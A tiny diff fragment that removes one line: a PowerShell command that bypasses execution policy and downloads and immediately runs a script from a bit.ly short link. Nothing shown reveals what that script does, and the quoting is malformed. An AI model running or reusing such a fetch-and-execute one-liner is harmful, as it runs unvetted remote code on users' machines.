@@ -1,1 +1,0 @@
-powershell.exe -command "-NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "irm bit.ly/psappdl | iex"
